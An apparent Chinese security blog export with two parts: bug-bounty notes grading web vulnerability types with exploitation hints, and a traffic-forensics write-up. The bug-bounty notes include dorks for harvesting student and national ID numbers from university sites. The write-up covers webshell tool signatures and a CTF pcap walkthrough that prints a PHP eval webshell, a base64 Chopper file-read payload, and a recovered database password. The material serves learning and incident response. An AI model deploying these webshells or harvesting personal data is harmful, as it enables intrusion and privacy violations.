<td align="center">php敏感信息泄露</td>
<td align="center">高</td>
<td align="center">可以先burp抓包得到公众号域名，然后使用jsfinder来扫url</td>
</tr>
</tbody></table>
<h1 id="web漏洞："><a href="#web漏洞：" class="headerlink" title="web漏洞："></a>web漏洞：</h1><p>等级判定可参考：<a href="https://help.aliyun.com/document_detail/40067.html">https://help.aliyun.com/document_detail/40067.html</a></p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">短信验证码可暴力破解</td>
<td align="center">中</td>
<td align="center">开发人员一般依赖于HTTP Host header。</td>
</tr>
<tr>
<td align="center">url重定向漏洞</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">文件绝对路径泄露也算</td>
</tr>
<tr>
<td align="center">cookies敏感信息泄露</td>
<td align="center">低</td>
<td align="center">这都算（</td>
</tr>
<tr>
<td align="center">Host头攻击</td>
<td align="center">中</td>
<td align="center">例如，在php里用_SERVER[“HTTP_HOST”]。但是这个header是不可信赖的，如果应用程序没有对host header值进行处理，就有可能造成恶意代码的传入。</td>
</tr>
<tr>
<td align="center">登录绕过</td>
<td align="center">高</td>
<td align="center">只要用户名对就可登录，密码无所谓（还能有这种情况</td>
</tr>
<tr>
<td align="center">明文传输</td>
<td align="center">中</td>
<td align="center">未对传输的账号密码进行加密且未使用https</td>
</tr>
<tr>
<td align="center">SL证书认证文件</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">滑块验证码失效</td>
<td align="center">中</td>
<td align="center">滑块失效</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">error.log</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">nginx-status</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">前端加密方法泄露也算</td>
</tr>
<tr>
<td align="center">存储型XSS</td>
<td align="center">高</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">弱口令</td>
<td align="center">高</td>
<td align="center">弱口令竟然都算高</td>
</tr>
<tr>
<td align="center">验证码失效</td>
<td align="center">中</td>
<td align="center">验证码没在服务器端验证</td>
</tr>
<tr>
<td align="center">crossdomain.xml文件配置不当</td>
<td align="center">中</td>
<td align="center">可能导致csrf</td>
</tr>
<tr>
<td align="center">反射型xss</td>
<td align="center">中</td>
<td align="center">恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的</td>
</tr>
<tr>
<td align="center">逻辑漏洞之任意用户登录</td>
<td align="center">高</td>
<td align="center">修改返回包直接登录</td>
</tr>
<tr>
<td align="center">暴力破解</td>
<td align="center">中</td>
<td align="center">密码错误长度相同，且多次爆破没返回次数限制</td>
</tr>
<tr>
<td align="center">越权访问</td>
<td align="center">低</td>
<td align="center">根据越权修改ID获取他人余额(看到有的等级是高</td>
</tr>
<tr>
<td align="center">内网IP地址泄露</td>
<td align="center">低</td>
<td align="center">直接返回IP而不是域名，惊（注释的内网IP泄露竟然也算</td>
</tr>
<tr>
<td align="center">Fastjson反序列化漏洞</td>
<td align="center">中</td>
<td align="center">可以dnslog验证，（看到json数据传输可以试试看是不是fastjson，也是其一个特征，<a href="https://cloud.tencent.com/developer/article/1957185">浅析FastJSON反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></td>
</tr>
<tr>
<td align="center">信息泄露</td>
<td align="center">低|高</td>
<td align="center">破坏请求头结构，使得报错，返回详细报错信息（等级看泄露东西的严重性</td>
</tr>
<tr>
<td align="center">链接注入漏洞</td>
<td align="center">中</td>
<td align="center">感觉属于xss，但可以点击链接跳转（确实，同一个点刷了两个洞</td>
</tr>
<tr>
<td align="center">任意文件上传</td>
<td align="center">中</td>
<td align="center">上传任意后缀文件</td>
</tr>
<tr>
<td align="center">CSRF</td>
<td align="center">中</td>
<td align="center">对应表单，burp抓包，bp CSRF POC构造</td>
</tr>
<tr>
<td align="center">未授权访问</td>
<td align="center">中|高</td>
<td align="center">直接不需要登录就管理界面，加token等</td>
</tr>
<tr>
<td align="center">软件压缩目录泄露</td>
<td align="center">中</td>
<td align="center">可以多扫目录试试</td>
</tr>
<tr>
<td align="center">Webpack源码泄漏</td>
<td align="center">中</td>
<td align="center">webpack是一个打包器，能将多个文件打包成一个文件。（在源代码处看到webpack可以仔细检查确定是否存在该漏洞</td>
</tr>
<tr>
<td align="center">CORS</td>
<td align="center">中</td>
<td align="center">特征：Access-Control-Allow-Origin：*，cors漏洞一般用于窃取用户敏感数据</td>
</tr>
<tr>
<td align="center">tomcat示例目录未删除</td>
<td align="center">低</td>
<td align="center">*&#x2F;docs&#x2F;，存在说明文档</td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center">低</td>
<td align="center">利用该信息可以更容易得到网站权限</td>
</tr>
<tr>
<td align="center">spring-boot端点未授权</td>
<td align="center">高</td>
<td align="center">例如：*&#x2F;prod-api&#x2F;actuator&#x2F;env，会泄露敏感信息；特征：左上角绿叶，对应报错信息；参考：<a href="https://blog.csdn.net/guo15890025019/article/details/119885737">Spring Boot Actuator未授权访问漏洞利用_springboot漏洞利用_大鸟安全的博客-CSDN博客</a></td>
</tr>
<tr>
<td align="center">图形验证码失效</td>
<td align="center">中</td>
<td align="center">使用相同验证码多次重发，验证码仍可用</td>
</tr>
<tr>
<td align="center">中间件版本泄露</td>
<td align="center">低</td>
<td align="center">一般不收</td>
</tr>
<tr>
<td align="center">批量提交</td>
<td align="center">中</td>
<td align="center">表单重复提交，会造成数据重复，增加服务器负载，严重甚至会造成服务器宕机（这都算</td>
</tr>
<tr>
<td align="center">swagger未授权</td>
<td align="center">高</td>
<td align="center"><a href="https://cloud.tencent.com/developer/article/2160217">Swagger未授权访问漏洞 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>，会暴露接口地址，从而可能被进行利用</td>
</tr>
<tr>
<td align="center">短信验证码爆破漏洞</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">用户名枚举</td>
<td align="center">低</td>
<td align="center">可以根据验证码结合，当用户存在会发验证码，不存在不会发</td>
</tr>
<tr>
<td align="center">Thymeleaf远程命令执行</td>
<td align="center">高</td>
<td align="center">若依CMS</td>
</tr>
<tr>
<td align="center">接口文档泄露</td>
<td align="center">高</td>
<td align="center">有的XML文档包含接口也算</td>
</tr>
<tr>
<td align="center">phpinfo界面泄露</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Nginx主机实时监控流量数据泄露</td>
<td align="center">高</td>
<td align="center">*&#x2F;statusicon&#x2F;</td>
</tr>
<tr>
<td align="center">Source Map</td>
<td align="center">中</td>
<td align="center">*.js.map</td>
</tr>
<tr>
<td align="center">Springboot Snake YAML</td>
<td align="center">高</td>
<td align="center">反弹shell</td>
</tr>
<tr>
<td align="center">上传jspgetshell</td>
<td align="center">高</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">逻辑漏洞</td>
<td align="center">高</td>
<td align="center">一般余额都是保留到分(也就是0.00)，充值0.019如果平台校验有问题会四舍五入，然后白嫖一分。</td>
</tr>
<tr>
<td align="center">刷赞</td>
<td align="center">中</td>
<td align="center">turbo intruder 模式下进行并发 选择race.py，在数据包任意位置加上%s 攻击</td>
</tr>
<tr>
<td align="center">添加现在</td>
<td align="center">高</td>
<td align="center">turbo intruder 模式下进行并发 选择race.py</td>
</tr>
<tr>
<td align="center">不收限制的资源调用</td>
<td align="center">高</td>
<td align="center">调用接口消耗资源，爆破信息</td>
</tr>
<tr>
<td align="center">短信验证码复用漏洞</td>
<td align="center">低</td>
<td align="center">登录成功后不失效</td>
</tr>
<tr>
<td align="center">验证码与手机号未绑定</td>
<td align="center">高</td>
<td align="center">未绑定手机号，任意修改密码</td>
</tr>
<tr>
<td align="center">验证码爆破</td>
<td align="center">高</td>
<td align="center">手机号码前后加空格，86，086，0086，+86，0，00，&#x2F;r,&#x2F;n, 以及特殊符号等。或者url编码</td>
</tr>
<tr>
<td align="center">csrf</td>
<td align="center">高</td>
<td align="center">使用cookie等本地凭证在<img>打等</td>
</tr>
<tr>
<td align="center">逻辑并发</td>
<td align="center">中</td>
<td align="center">领东西的时候并发测试</td>
</tr>
<tr>
<td align="center">时间校验漏洞</td>
<td align="center">中</td>
<td align="center">某些会员通过本地时间判断</td>
</tr>
<tr>
<td align="center">手机验证码回显</td>
<td align="center">中</td>
<td align="center">（没见到谁这么干过</td>
</tr>
<tr>
<td align="center">首单优惠绕过</td>
<td align="center">中</td>
<td align="center">优惠数据包重发</td>
</tr>
<tr>
<td align="center">xss</td>
<td align="center">中</td>
<td align="center">上传html文件中有xss，路径随机但host相同也算（竟然都要算</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">匿名用户uid泄露等，身份证暴露等</td>
</tr>
<tr>
<td align="center">邮箱轰炸</td>
<td align="center">中</td>
<td align="center">还以为只有短信轰炸才算</td>
</tr>
<tr>
<td align="center">越权</td>
<td align="center">中</td>
<td align="center">订单收获地址一般都有</td>
</tr>
</tbody></table>
<h2 id="APP漏洞："><a href="#APP漏洞：" class="headerlink" title="APP漏洞："></a>APP漏洞：</h2><p><del>等我学习了在更新</del></p>
<h2 id="公众号小程序漏洞"><a href="#公众号小程序漏洞" class="headerlink" title="公众号小程序漏洞"></a>公众号小程序漏洞</h2><h2 id="SRC挖掘技巧"><a href="#SRC挖掘技巧" class="headerlink" title="SRC挖掘技巧"></a>SRC挖掘技巧</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>多看burp http-history看</p>
<p>jsfind</p>
<p>控制台</p>
<h3 id="利用fofa语法"><a href="#利用fofa语法" class="headerlink" title="利用fofa语法"></a>利用fofa语法</h3><p>“系统” &amp;&amp; org&#x3D;”China Education and Research Network Center”，我们可以看见红色框内是有很多图标，这些有可能就是系统的指纹，fofa直接给你归纳好的，现在我们只需要一个一个图标打开然后用傻瓜式渗透顺序打一通</p>
<p><a href="https://zhuanlan.zhihu.com/p/622876836">FOFA入门指南：轻松掌握搜索技巧和特色功能 - 知乎 (zhihu.com)</a></p>
<h3 id="查看开发商排行榜"><a href="#查看开发商排行榜" class="headerlink" title="查看开发商排行榜"></a>查看开发商排行榜</h3><p>edu平台的跟新，我发现他多了一个开发商排行，这样等于是给我们列出来了edu用户的系统公司，就可以节省我们的时间再去查找开发商来找对应的系统，确定系统寻找手册弱口令</p>
<h3 id="利用谷歌hacking、咸鱼、github搜集敏感信息"><a href="#利用谷歌hacking、咸鱼、github搜集敏感信息" class="headerlink" title="利用谷歌hacking、咸鱼、github搜集敏感信息"></a>利用谷歌hacking、咸鱼、github搜集敏感信息</h3><p>site:.edu.cn sfz  filetype: pdf|xls|doc</p>
<p>site:edu.cn (filetype:pdf OR filetype:xls OR filetype:doc)</p>
<p>学号 工号 身份证</p>
<p>去找所在学校相关的教育局站点，因为助学金等奖励都会通过当地教育局进行展开，这样在相关教育局站点我们也可以收集到我们需要的信息，当然你也可以加入班群，表白墙等容易泄露信息的地方。高校网站找找到门户服务网站，此时一定要注意门户网站的帮助</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>关注漏洞库：<a href="http://www.i-dock.net/">PeiQi文库 (i-dock.net)</a>，有网站测绘，即搜索语法使用起来还挺方便</p>
<h2 id="github信息收集"><a href="#github信息收集" class="headerlink" title="github信息收集"></a>github信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtihub搜索语法:</span><br><span class="line">in:name baidu              #标题搜索含有关键字baidu</span><br><span class="line">in:descripton baidu         #仓库描述搜索含有关键字</span><br><span class="line">in:readme baidu             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 baidu           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 baidu      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 baidu           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 baidu      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 baidu           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 baidu    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 baidu   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:name                  #用户名搜素</span><br><span class="line">license:apache-2.0 baidu    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java baidu         #在java语言的代码中搜索关键字</span><br><span class="line">user:baidu in:name baidu     #组合搜索,用户名baidu的标题含有baidu的</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories">https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories</a></p>
<p>自动化工具GitDorker: <a href="https://github.com/obheda12/GitDorker%EF%BC%88%E6%B2%A1%E5%AE%89%E6%84%9F%E8%A7%89%E8%87%AA%E5%B7%B1%E6%89%8B%E5%B7%A5github%E6%90%9C%E4%B9%9F%E8%A1%8C%EF%BC%89">https://github.com/obheda12/GitDorker（没安感觉自己手工github搜也行）</a></p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析与应急响应</title>
    <url>/2023/04/24/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_32393893/article/details/117574848">CTF之流量分析_ctf 流量分析_shy014的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_53577336/article/details/125048353">Webshell工具的流量特征分析（菜刀，蚁剑，冰蝎，哥斯拉）_冰蝎流量特征_告白热的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/eternitymd/article/details/124492261">菜刀、冰蝎、蚁剑、哥斯拉的流量特征_蚁剑流量特征_呜呼起飞~的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_42880719/article/details/122148345">ctfshow 摆烂杯 writeup_jiajia-cp-1_是Mumuzi的博客-CSDN博客</a></p>
<span id="more"></span>

<h2 id="常见指纹"><a href="#常见指纹" class="headerlink" title="常见指纹"></a>常见指纹</h2><p>过滤语句：http contains “sqlmap”</p>
<p>Awvs:<br>AWVS扫描器在请求的URL，Headers, Body三项里随机包含了能代表自己的特征信息</p>
<p>&lt;1&gt; Url: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acunetix-wvs-test-for-some-inexistent-file</span><br><span class="line">by_wvs</span><br><span class="line">acunetix_wvs_security_testacunetix</span><br><span class="line">acunetix_wvs</span><br><span class="line">acunetix_test</span><br></pre></td></tr></table></figure>

<p>&lt;2&gt; Headers:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Acunetix-Aspect-Password:</span><br><span class="line">Cookie: acunetixCookie</span><br><span class="line">Location: acunetix_wvs_security_testX-Forwarded-Host: acunetix_wvs_security_testX-Forwarded-For: acunetix_wvs_security_testHost: acunetix_wvs_security_testCookie: acunetix_wvs_security_testCookie: acunetix</span><br><span class="line">Accept: acunetix/wvs</span><br><span class="line">Origin: acunetix_wvs_security_testReferer: acunetix_wvs_security_testVia: acunetix_wvs_security_testAccept-Language: acunetix_wvs_security_testClient-IP: acunetix_wvs_security_testHTTP_AUTH_PASSWD: acunetix</span><br><span class="line">User-Agent: acunetix_wvs_security_testAcunetix-Aspect-Queries:任意值</span><br><span class="line">Acunetix-Aspect:任意值</span><br></pre></td></tr></table></figure>

<p>&lt;3&gt; Body </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acunetix_wvs_security_testacunetix</span><br></pre></td></tr></table></figure>



<p>Appscan:</p>
<p>Appscan依然在请求的URL，Headers，Body三项里随机包含了能代表自己的特征信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;Url</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">Content-Type: Appscan</span><br><span class="line">Content-Type: AppScanHeader</span><br><span class="line">Accept: Appscan</span><br><span class="line">User-Agent:Appscan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>



<p>Nessus:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt; Url</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>



<ul>
<li>x_forwarded_for:nessus</li>
<li>referer:nessus</li>
<li>host:nessus</li>
</ul>
<p>sqlmap:</p>
<ul>
<li>User-Agent:sqlmap1.2.8#stable</li>
</ul>
<p>Netsparker: </p>
<ul>
<li>X-Scanner:NetsparkerLocation:</li>
<li>NetsparkerAccept:netsparker&#x2F;chechCookie:</li>
<li>netsparkerCookie:NETSPARKER</li>
</ul>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>1.请求包中会有eval，assert, base64的特征字符（这里如果用eval方法就是eval ,如果是assert方法就是assert）<br>2.payload为base64加密，且为默认为&amp;z0&#x3D;QGluaV9zZXQ… 参数z0对应$_POST[z0]接收到的数据<br>且固定为QGluaV9zZXQ开头</p>
<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>默认的蚁剑 shell，连接时会请求两次，其请求体只是经过 url 编码</p>
<p>第一次请求，关闭报错和 magic_quotes，接下来去获取主机的信息</p>
<p>第二次请求，会把主机目录列出来</p>
<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><h4 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h4><p>使用 aes 加密发起三次请求</p>
<p>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的</p>
<p>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p>
<h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>使用 aes 加密发起两次请求</p>
<p>3.0 分析流量发现相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key，改为取连接密码的 md5 加密值的前 16 位作为密钥</p>
<p>一次请求为判断是否可以建立连接，少了俩次 get 获取冰蝎动态密钥的行为，第二次发送 phpinfo 等代码执行，获取网站的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.请求数据包中的content-type字段常见为application/octet-stream；</span><br><span class="line"> 2.内置16个user-agent头</span><br><span class="line"> 3.content-lengt]请求长度，对于密钥交互，获取基本信息来讲，payload都为定长。</span><br></pre></td></tr></table></figure>

<h4 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Accep和Content-Type为弱特征且Content-type:一般为Application/x-www-form-urlencoded，这里可作为辅助特征</span><br><span class="line">2.内置10个user-agent ,每次连接shell时会随机选择一个进行使用.</span><br><span class="line">3.因为冰蝎4.0建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右</span><br><span class="line">4.冰蝎通讯默认使用长连接，请求头和响应头里会带有 Connection且Connection为 Keep-Alive</span><br><span class="line">5.有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M</span><br><span class="line">响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</span><br><span class="line">6.默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br></pre></td></tr></table></figure>



<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>支持多种加密</p>
<p>采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.user-agent,如果不修改的话会返回使用的jdk信息</span><br><span class="line">2.在请求包的Cookie中有一个非常致命的特征是会在最后出现分号</span><br><span class="line">3.请求Accept和响应中Cache-Control字段（辅助认证）</span><br><span class="line">4.响应包中的数据前16位为MD5+base64+后16位为MD5。</span><br></pre></td></tr></table></figure>





<h2 id="做题："><a href="#做题：" class="headerlink" title="做题："></a>做题：</h2><p>链接：<a href="https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray">https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray</a> </p>
<p>答案链接：链接：<a href="https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q">https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q</a><br>提取码：087q </p>
<p>1、黑客使用的扫描器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;wvs&quot;</span><br></pre></td></tr></table></figure>

<p>2、先黑客扫描到的后台登陆地址是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;login&quot;	</span><br></pre></td></tr></table></figure>

<p>在：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;login.php?rec&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>3、黑客使用了什么账号密码登陆了web后台</p>
<p>同二可得到答案</p>
<p>4、黑客上传的webshell文件名是，内容是什么</p>
<p>关键词：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval</span><br><span class="line">assert</span><br><span class="line">system</span><br></pre></td></tr></table></figure>

<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;eval&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>很快的定位到黑客上传的木马的地址：&#x2F;images&#x2F;article&#x2F;a.php</p>
<p>传的🐎密码为1234</p>
<p>再：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;[1234]&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;keywords&quot;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php &lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure>

<p>5、黑客在robots.txt中找到的flag是什么：</p>
<p>直接搜robots.txt的关键词 Disallow 就好了</p>
<p>注意大小写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;Disallow&quot;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag:87b7cb79481f317bde90c116cf36084b</span><br></pre></td></tr></table></figure>

<p>6、黑客找到的数据库密码是多少：</p>
<p>分析菜刀流量</p>
<p>搜索：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;1234=&quot;</span><br></pre></td></tr></table></figure>

<p>然后追踪tcp流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /images/article/a.php HTTP/1.1</span><br><span class="line">User-Agent: Java/1.8.0_171</span><br><span class="line">Host: 192.168.32.189</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 375</span><br><span class="line"></span><br><span class="line">1234=@eval.(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D&amp;z1=L3Zhci93d3cvaHRtbC9kYXRhL2NvbmZpZy5waHA%3DHTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 08 Aug 2018 08:18:05 GMT</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.4.45</span><br><span class="line">Content-Length: 1092</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">-&gt;|&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * DouPHP</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ............ 2014-2015 ...............................................................</span><br><span class="line"> * ............: http://www.douco.com</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ..............................................................................................................................................................................</span><br><span class="line"> * ...............http://www.douco.com/license.html</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * Author: DouCo</span><br><span class="line"> * Release Date: 2015-06-10</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// database host</span><br><span class="line">$dbhost   = &quot;10.3.3.101&quot;;</span><br><span class="line"></span><br><span class="line">// database name</span><br><span class="line">$dbname   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// database username</span><br><span class="line">$dbuser   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line">// database password</span><br><span class="line">$dbpass   = &quot;e667jUPvJjXHvEUv&quot;;</span><br><span class="line"></span><br><span class="line">// table prefix</span><br><span class="line">$prefix   = &quot;dou_&quot;;</span><br><span class="line"></span><br><span class="line">// charset</span><br><span class="line">define(&#x27;DOU_CHARSET&#x27;,&#x27;utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">// administrator path</span><br><span class="line">define(&#x27;ADMIN_PATH&#x27;,&#x27;admin&#x27;);</span><br><span class="line"></span><br><span class="line">// mobile path</span><br><span class="line">define(&#x27;M_PATH&#x27;,&#x27;m&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure>

<p>所以数据库密码为：e667jUPvJjXHvEUv</p>
<p>7、黑客在数据库中找到的hash_code是什么：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.query matches &quot;hash_code&quot;</span><br></pre></td></tr></table></figure>

<p>d1c029893df40cb0f47bcf8f1c3c17ac</p>
<p>8、黑客破解了账号<a href="mailto:&#105;&#106;&#110;&#x75;&#x40;&#116;&#101;&#x73;&#116;&#46;&#x63;&#x6f;&#x6d;">&#105;&#106;&#110;&#x75;&#x40;&#116;&#101;&#x73;&#116;&#46;&#x63;&#x6f;&#x6d;</a>得到的密码是什么</p>
<p>mysql contains “<a href="mailto:&#x69;&#x6a;&#x6e;&#x75;&#x40;&#116;&#x65;&#115;&#x74;&#46;&#x63;&#111;&#109;">&#x69;&#x6a;&#x6e;&#x75;&#x40;&#116;&#x65;&#115;&#x74;&#46;&#x63;&#111;&#109;</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ijnu@test.com b78f5aa6e1606f07def6e839121a22ec.ADMIN</span><br></pre></td></tr></table></figure>

<p>md5解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edc123!@#</span><br></pre></td></tr></table></figure>

<p>9、被黑客攻击的web服务器，网卡配置是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure>

<p>答案：</p>
